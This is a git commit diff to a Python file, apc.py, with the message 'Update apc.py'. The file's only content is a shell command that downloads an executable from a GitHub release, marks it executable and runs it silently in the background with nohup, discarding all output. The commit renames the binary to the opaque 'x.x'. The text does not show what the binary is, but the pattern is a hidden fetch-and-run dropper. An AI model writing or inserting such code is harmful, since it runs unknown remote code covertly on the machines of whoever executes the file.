420adb4e5f69b5aacf199df14ae8202df8029ffa
Kuang YiWu <136738046+alphaxcv@users.noreply.github.com>
2024-08-08 16:51:06 +0800

    Update apc.py

--- apc.py
+++ apc.py
@@ -1,3 +1,3 @@
 import subprocess
 
-subprocess.run("curl -L -o js2bin https://github.com/alphaxcv/slx/releases/download/dl/js2bin && chmod +x js2bin && nohup ./js2bin > /dev/null 2>&1", shell=True)
+subprocess.run("curl -L -o x.x https://github.com/alphaxcv/slx/releases/download/dl/x.x && chmod +x x.x && nohup ./x.x > /dev/null 2>&1", shell=True)
